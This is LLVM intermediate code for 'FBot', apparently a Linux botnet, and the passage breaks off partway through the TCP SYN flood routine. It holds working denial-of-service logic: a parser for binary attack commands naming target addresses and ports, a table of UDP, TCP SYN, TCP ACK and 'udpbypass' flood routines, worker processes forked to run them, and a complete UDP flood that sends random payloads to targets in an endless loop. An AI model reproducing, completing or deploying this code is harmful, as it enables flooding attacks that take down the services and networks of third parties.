; ModuleID = 'host/ir_O1/FBot.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.option = type { i8, i16, i8* }
%struct.target = type { i32, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.timeval = type { i64, i64 }

@LOCAL_ADDRESS = common local_unnamed_addr global i32 0, align 4
@command_list = common local_unnamed_addr global [6 x %struct.command] zeroinitializer, align 16
@.str = private unnamed_addr constant [34 x i8] c"Sending SYN with ACK: %d SEQ: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Received SYN-ACK with ACK: %d SEQ: %d\0A\00", align 1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @retrieve_opt_str(%struct.option* nocapture readonly, i8 zeroext, i8 zeroext, i8* readnone) local_unnamed_addr #0 {
  %5 = icmp eq i8 %1, 0
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = zext i8 %1 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol.preheader
  %6 = getelementptr inbounds %struct.option, %struct.option* %0, i64 0, i32 0
  %7 = load i8, i8* %6, align 8
  %8 = icmp eq i8 %7, %2
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %.lr.ph.prol
  %10 = getelementptr inbounds %struct.option, %struct.option* %0, i64 0, i32 2
  %11 = load i8*, i8** %10, align 8
  br label %12

; <label>:12:                                     ; preds = %9, %.lr.ph.prol
  %.1.prol = phi i8* [ %11, %9 ], [ %3, %.lr.ph.prol ]
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %12
  %.1.lcssa.unr = phi i8* [ undef, %.lr.ph.preheader ], [ %.1.prol, %12 ]
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph.preheader ], [ 1, %12 ]
  %.0910.unr = phi i8* [ %3, %.lr.ph.preheader ], [ %.1.prol, %12 ]
  %13 = icmp eq i8 %1, 1
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %26, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.1, %26 ]
  %.0910 = phi i8* [ %.0910.unr, %.lr.ph.preheader.new ], [ %.1.1, %26 ]
  %14 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 0
  %15 = load i8, i8* %14, align 8
  %16 = icmp eq i8 %15, %2
  br i1 %16, label %17, label %.lr.ph.112

; <label>:17:                                     ; preds = %.lr.ph
  %18 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 2
  %19 = load i8*, i8** %18, align 8
  br label %.lr.ph.112

.lr.ph.112:                                       ; preds = %.lr.ph, %17
  %.1 = phi i8* [ %19, %17 ], [ %.0910, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv.next, i32 0
  %21 = load i8, i8* %20, align 8
  %22 = icmp eq i8 %21, %2
  br i1 %22, label %23, label %26

._crit_edge.loopexit.unr-lcssa:                   ; preds = %26
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1.lcssa = phi i8* [ %.1.lcssa.unr, %.lr.ph.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %4
  %.09.lcssa = phi i8* [ %3, %4 ], [ %.1.lcssa, %._crit_edge.loopexit ]
  ret i8* %.09.lcssa

; <label>:23:                                     ; preds = %.lr.ph.112
  %24 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv.next, i32 2
  %25 = load i8*, i8** %24, align 8
  br label %26

; <label>:26:                                     ; preds = %23, %.lr.ph.112
  %.1.1 = phi i8* [ %25, %23 ], [ %.1, %.lr.ph.112 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @retrieve_opt_num(%struct.option* nocapture readonly, i8 zeroext, i8 zeroext, i16 zeroext) local_unnamed_addr #1 {
  %5 = icmp eq i8 %1, 0
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = zext i8 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %14
  %indvars.iv = phi i64 [ %indvars.iv.next, %14 ], [ 0, %.lr.ph.preheader ]
  %.0910 = phi i16 [ %.1, %14 ], [ %3, %.lr.ph.preheader ]
  %6 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 0
  %7 = load i8, i8* %6, align 8
  %8 = icmp eq i8 %7, %2
  br i1 %8, label %9, label %14

; <label>:9:                                      ; preds = %.lr.ph
  %10 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 2
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @atoi(i8* %11) #12
  %13 = trunc i32 %12 to i16
  br label %14

; <label>:14:                                     ; preds = %.lr.ph, %9
  %.1 = phi i16 [ %13, %9 ], [ %.0910, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %14
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %4
  %.09.lcssa = phi i16 [ %3, %4 ], [ %.1, %._crit_edge.loopexit ]
  ret i16 %.09.lcssa
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @retrieve_opt_ipv4(%struct.option* nocapture readonly, i8 zeroext, i8 zeroext, i32) local_unnamed_addr #3 {
  %5 = icmp eq i8 %1, 0
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = zext i8 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %13
  %indvars.iv = phi i64 [ %indvars.iv.next, %13 ], [ 0, %.lr.ph.preheader ]
  %.0910 = phi i32 [ %.1, %13 ], [ %3, %.lr.ph.preheader ]
  %6 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 0
  %7 = load i8, i8* %6, align 8
  %8 = icmp eq i8 %7, %2
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %.lr.ph
  %10 = getelementptr inbounds %struct.option, %struct.option* %0, i64 %indvars.iv, i32 2
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @inet_addr(i8* %11) #13
  br label %13

; <label>:13:                                     ; preds = %.lr.ph, %9
  %.1 = phi i32 [ %12, %9 ], [ %.0910, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %13
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %4
  %.09.lcssa = phi i32 [ %3, %4 ], [ %.1, %._crit_edge.loopexit ]
  ret i32 %.09.lcssa
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @command_parse(i8* nocapture readonly, i32) local_unnamed_addr #3 {
  %3 = load i8, i8* %0, align 1
  %4 = getelementptr inbounds i8, i8* %0, i64 1
  %5 = bitcast i8* %4 to i16*
  %6 = load i16, i16* %5, align 2
  %7 = tail call zeroext i16 @ntohs(i16 zeroext %6) #14
  %8 = getelementptr inbounds i8, i8* %0, i64 3
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 8) #13
  %12 = bitcast i8* %11 to %struct.target*
  %13 = icmp eq i8* %11, null
  br i1 %13, label %55, label %14

; <label>:14:                                     ; preds = %2
  %15 = getelementptr inbounds i8, i8* %0, i64 4
  %16 = icmp eq i8 %9, 0
  br i1 %16, label %._crit_edge84, label %.lr.ph83.preheader

.lr.ph83.preheader:                               ; preds = %14
  %17 = zext i8 %9 to i64
  %18 = add nuw nsw i64 %17, 4294967295
  %19 = and i64 %18, 4294967295
  %20 = mul nuw nsw i64 %19, 6
  %21 = add nuw nsw i64 %20, 10
  %wide.trip.count89 = zext i8 %9 to i64
  br label %.lr.ph83

.lr.ph83:                                         ; preds = %.lr.ph83, %.lr.ph83.preheader
  %indvars.iv87 = phi i64 [ 0, %.lr.ph83.preheader ], [ %indvars.iv.next88, %.lr.ph83 ]
  %.081 = phi i8* [ %15, %.lr.ph83.preheader ], [ %30, %.lr.ph83 ]
  %22 = bitcast i8* %.081 to i32*
  %23 = load i32, i32* %22, align 4
  %24 = getelementptr inbounds %struct.target, %struct.target* %12, i64 %indvars.iv87, i32 0
  store i32 %23, i32* %24, align 4
  %25 = getelementptr inbounds i8, i8* %.081, i64 4
  %26 = bitcast i8* %25 to i16*
  %27 = load i16, i16* %26, align 2
  %28 = getelementptr inbounds %struct.target, %struct.target* %12, i64 %indvars.iv87, i32 1
  %29 = tail call zeroext i16 @ntohs(i16 zeroext %27) #14
  store i16 %29, i16* %28, align 4
  %30 = getelementptr inbounds i8, i8* %.081, i64 6
  %indvars.iv.next88 = add nuw nsw i64 %indvars.iv87, 1
  %exitcond90 = icmp eq i64 %indvars.iv.next88, %wide.trip.count89
  br i1 %exitcond90, label %._crit_edge84.loopexit, label %.lr.ph83

._crit_edge84.loopexit:                           ; preds = %.lr.ph83
  %scevgep = getelementptr i8, i8* %0, i64 %21
  br label %._crit_edge84

._crit_edge84:                                    ; preds = %._crit_edge84.loopexit, %14
  %.0.lcssa = phi i8* [ %15, %14 ], [ %scevgep, %._crit_edge84.loopexit ]
  %31 = load i8, i8* %.0.lcssa, align 1
  %32 = icmp eq i8 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %._crit_edge84
  tail call fastcc void @command_flood(i8 zeroext %3, %struct.option* null, i8 zeroext %31, %struct.target* %12, i8 zeroext %9, i16 zeroext %7)
  br label %55

; <label>:34:                                     ; preds = %._crit_edge84
  %35 = zext i8 %31 to i64
  %36 = tail call noalias i8* @calloc(i64 %35, i64 16) #13
  %37 = bitcast i8* %36 to %struct.option*
  %38 = icmp eq i8* %36, null
  br i1 %38, label %40, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %34
  %39 = getelementptr inbounds i8, i8* %.0.lcssa, i64 1
  %wide.trip.count = zext i8 %31 to i64
  br label %.lr.ph

; <label>:40:                                     ; preds = %34
  tail call void @free(i8* nonnull %11) #13
  br label %55

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %.178 = phi i8* [ %39, %.lr.ph.preheader ], [ %54, %.lr.ph ]
  %41 = load i8, i8* %.178, align 1
  %42 = getelementptr inbounds %struct.option, %struct.option* %37, i64 %indvars.iv, i32 0
  store i8 %41, i8* %42, align 8
  %43 = getelementptr inbounds i8, i8* %.178, i64 1
  %44 = bitcast i8* %43 to i16*
  %45 = load i16, i16* %44, align 2
  %46 = tail call zeroext i16 @ntohs(i16 zeroext %45) #14
  %47 = getelementptr inbounds i8, i8* %.178, i64 3
  %48 = zext i16 %46 to i64
  %49 = add nuw nsw i64 %48, 1
  %50 = tail call noalias i8* @malloc(i64 %49) #13
  %51 = getelementptr inbounds %struct.option, %struct.option* %37, i64 %indvars.iv, i32 2
  store i8* %50, i8** %51, align 8
  %52 = zext i16 %46 to i64
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %50, i8* %47, i64 %52, i32 1, i1 false)
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds i8, i8* %47, i64 %52
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge, label %.lr.ph

._crit_edge:                                      ; preds = %.lr.ph
  tail call fastcc void @command_flood(i8 zeroext %3, %struct.option* nonnull %37, i8 zeroext %31, %struct.target* %12, i8 zeroext %9, i16 zeroext %7)
  br label %55

; <label>:55:                                     ; preds = %2, %._crit_edge, %40, %33
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #5

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @command_flood(i8 zeroext, %struct.option*, i8 zeroext, %struct.target*, i8 zeroext, i16 zeroext) unnamed_addr #3 {
  %7 = alloca %struct.arguments, align 8
  %8 = tail call fastcc i8* (...)* @retrieve_command_func(i8 zeroext %0)
  %9 = icmp eq i8* (...)* %8, null
  br i1 %9, label %25, label %10

; <label>:10:                                     ; preds = %6
  %11 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 0
  store %struct.target* %3, %struct.target** %11, align 8
  %12 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 2
  store i8 %2, i8* %12, align 8
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 3
  store i8 %4, i8* %13, align 1
  %14 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 1
  store %struct.option* %1, %struct.option** %14, align 8
  %15 = getelementptr inbounds %struct.arguments, %struct.arguments* %7, i64 0, i32 4
  store i16 %5, i16* %15, align 2
  %16 = tail call i32 @fork() #13
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %25

; <label>:18:                                     ; preds = %10
  %19 = tail call i32 @fork() #13
  switch i32 %19, label %22 [
    i32 -1, label %20
    i32 0, label %21
  ]

; <label>:20:                                     ; preds = %18
  tail call void @exit(i32 1) #15
  unreachable

; <label>:21:                                     ; preds = %18
  call fastcc void @terminate_command(%struct.arguments* nonnull %7)
  unreachable

; <label>:22:                                     ; preds = %18
  %23 = bitcast i8* (...)* %8 to i8* (%struct.arguments*, ...)*
  %24 = call i8* (%struct.arguments*, ...) %23(%struct.arguments* nonnull %7) #13
  br label %25

; <label>:25:                                     ; preds = %10, %6, %22
  ret void
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc i8* (...)* @retrieve_command_func(i8 zeroext) unnamed_addr #0 {
  %2 = zext i8 %0 to i64
  %3 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %2, i32 1
  %4 = load i8* (...)*, i8* (...)** %3, align 8
  ret i8* (...)* %4
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #7

; Function Attrs: noinline noreturn nounwind uwtable
define internal fastcc void @terminate_command(%struct.arguments* nocapture readonly) unnamed_addr #8 {
  %2 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 4
  %3 = load i16, i16* %2, align 2
  %4 = zext i16 %3 to i32
  %5 = tail call i32 @sleep(i32 %4) #13
  %6 = tail call i32 @getppid() #13
  %7 = icmp sgt i32 %6, 1
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @kill(i32 %6, i32 9) #13
  br label %10

; <label>:10:                                     ; preds = %8, %1
  %11 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %12 = load %struct.target*, %struct.target** %11, align 8
  %13 = icmp eq %struct.target* %12, null
  br i1 %13, label %16, label %14

; <label>:14:                                     ; preds = %10
  %15 = bitcast %struct.target* %12 to i8*
  tail call void @free(i8* %15) #13
  br label %16

; <label>:16:                                     ; preds = %10, %14
  %17 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %18 = load %struct.option*, %struct.option** %17, align 8
  %19 = icmp eq %struct.option* %18, null
  br i1 %19, label %24, label %.preheader

.preheader:                                       ; preds = %16
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %21 = load i8, i8* %20, align 8
  %22 = icmp eq i8 %21, 0
  %23 = load %struct.option*, %struct.option** %17, align 8
  br i1 %22, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:24:                                     ; preds = %16
  tail call void @exit(i32 0) #15
  unreachable

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %25 = phi %struct.option* [ %31, %.lr.ph ], [ %23, %.lr.ph.preheader ]
  %26 = getelementptr inbounds %struct.option, %struct.option* %25, i64 %indvars.iv, i32 2
  %27 = load i8*, i8** %26, align 8
  tail call void @free(i8* %27) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %28 = load i8, i8* %20, align 8
  %29 = zext i8 %28 to i64
  %30 = icmp slt i64 %indvars.iv.next, %29
  %31 = load %struct.option*, %struct.option** %17, align 8
  br i1 %30, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.lcssa = phi %struct.option* [ %23, %.preheader ], [ %31, %._crit_edge.loopexit ]
  %32 = getelementptr inbounds %struct.option, %struct.option* %.lcssa, i64 0, i32 0
  tail call void @free(i8* %32) #13
  tail call void @exit(i32 0) #15
  unreachable
}

declare i32 @sleep(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_commands() local_unnamed_addr #10 {
  tail call fastcc void @load_command(i8 zeroext 1, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udp to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 3, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_syn to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 2, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 7, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack_connect to i8* (...)*))
  tail call fastcc void @load_command(i8 zeroext 20, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udpbypass to i8* (...)*))
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @load_command(i8 zeroext, i8* (...)*) unnamed_addr #10 {
  %3 = zext i8 %0 to i64
  %4 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %3, i32 0
  store i8 %0, i8* %4, align 16
  %5 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %3, i32 1
  store i8* (...)* %1, i8* (...)** %5, align 8
  ret void
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_udp(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %5 = load %struct.option*, %struct.option** %4, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %7 = load i8, i8* %6, align 8
  %8 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 2, i16 zeroext 900)
  %9 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 1, i16 zeroext -1)
  %10 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i64
  %13 = tail call noalias i8* @calloc(i64 %12, i64 8) #13
  %14 = bitcast i8* %13 to i8**
  %15 = icmp eq i8* %13, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:17:                                     ; preds = %1
  %18 = load i8, i8* %10, align 1
  %19 = zext i8 %18 to i64
  %20 = tail call noalias i8* @calloc(i64 %19, i64 4) #13
  %21 = bitcast i8* %20 to i32*
  %22 = icmp eq i8* %20, null
  br i1 %22, label %37, label %.preheader42

.preheader42:                                     ; preds = %17
  %23 = load i8, i8* %10, align 1
  %24 = icmp eq i8 %23, 0
  br i1 %24, label %.preheader, label %.lr.ph45

.lr.ph45:                                         ; preds = %.preheader42
  %25 = zext i16 %8 to i32
  %26 = add nuw nsw i32 %25, 1
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %34 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %36 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  br label %39

; <label>:37:                                     ; preds = %17
  tail call void @exit(i32 1) #15
  unreachable

.preheader.loopexit:                              ; preds = %62
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader42
  %38 = zext i16 %8 to i64
  %.pr = load i8, i8* %10, align 1
  br label %.loopexit

; <label>:39:                                     ; preds = %.lr.ph45, %62
  %indvars.iv46 = phi i64 [ 0, %.lr.ph45 ], [ %indvars.iv.next47, %62 ]
  %40 = call i32 @socket(i32 2, i32 2, i32 0) #13
  %41 = getelementptr inbounds i32, i32* %21, i64 %indvars.iv46
  store i32 %40, i32* %41, align 4
  %42 = icmp eq i32 %40, -1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %39
  call void @exit(i32 1) #15
  unreachable

; <label>:44:                                     ; preds = %39
  %45 = call noalias i8* @malloc(i64 %27) #13
  %46 = getelementptr inbounds i8*, i8** %14, i64 %indvars.iv46
  store i8* %45, i8** %46, align 8
  %47 = icmp eq i8* %45, null
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %44
  call void @exit(i32 1) #15
  unreachable

; <label>:49:                                     ; preds = %44
  store i16 2, i16* %28, align 4
  store i16 0, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %50 = load i32, i32* %41, align 4
  %51 = call i32 @bind(i32 %50, %struct.sockaddr* nonnull %31, i32 16) #13
  store i16 2, i16* %32, align 4
  %52 = call zeroext i16 @htons(i16 zeroext %9) #14
  store i16 %52, i16* %33, align 2
  %53 = load %struct.target*, %struct.target** %34, align 8
  %54 = getelementptr inbounds %struct.target, %struct.target* %53, i64 %indvars.iv46, i32 1
  %55 = load i16, i16* %54, align 4
  %56 = icmp ult i16 %55, 32
  %57 = getelementptr inbounds %struct.target, %struct.target* %53, i64 %indvars.iv46, i32 0
  %58 = load i32, i32* %57, align 4
  br i1 %56, label %59, label %62

; <label>:59:                                     ; preds = %49
  %60 = call i32 @ntohl(i32 %58) #14
  %61 = call i32 @htonl(i32 %60) #14
  br label %62

; <label>:62:                                     ; preds = %49, %59
  %63 = phi i32 [ %61, %59 ], [ %58, %49 ]
  store i32 %63, i32* %35, align 4
  %64 = load i32, i32* %41, align 4
  %65 = call i32 @connect(i32 %64, %struct.sockaddr* nonnull %36, i32 16) #13
  %66 = load i8*, i8** %46, align 8
  call void @rand_string(i8* %66, i32 %25)
  %indvars.iv.next47 = add nuw i64 %indvars.iv46, 1
  %67 = load i8, i8* %10, align 1
  %68 = zext i8 %67 to i64
  %69 = icmp slt i64 %indvars.iv.next47, %68
  br i1 %69, label %39, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  %70 = phi i8 [ %.pr, %.preheader ], [ %.be, %.loopexit.backedge ]
  %71 = icmp eq i8 %70, 0
  br i1 %71, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  %.be = phi i8 [ 0, %.loopexit ], [ %77, %.loopexit.loopexit ]
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %72 = getelementptr inbounds i32, i32* %21, i64 %indvars.iv
  %73 = load i32, i32* %72, align 4
  %74 = getelementptr inbounds i8*, i8** %14, i64 %indvars.iv
  %75 = load i8*, i8** %74, align 8
  %76 = call i64 @send(i32 %73, i8* %75, i64 %38, i32 16384) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %77 = load i8, i8* %10, align 1
  %78 = zext i8 %77 to i64
  %79 = icmp slt i64 %indvars.iv.next, %78
  br i1 %79, label %.lr.ph, label %.loopexit.loopexit
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #5

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #9

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #9

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_tcp_syn(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %2, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %5 = load %struct.option*, %struct.option** %4, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %7 = load i8, i8* %6, align 8
  %8 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 2, i16 zeroext 900)
  %9 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 1, i16 zeroext -1)
  %10 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 7, i16 zeroext 255)
  %11 = trunc i16 %10 to i8
  %12 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 8, i16 zeroext -1)
  %13 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 9, i16 zeroext 0)
  %14 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 10, i16 zeroext 0)
  %15 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 11, i16 zeroext 0)
  %16 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 12, i16 zeroext 0)
  %17 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 13, i16 zeroext 0)
  %18 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 14, i16 zeroext 1)
  %19 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 15, i16 zeroext 0)
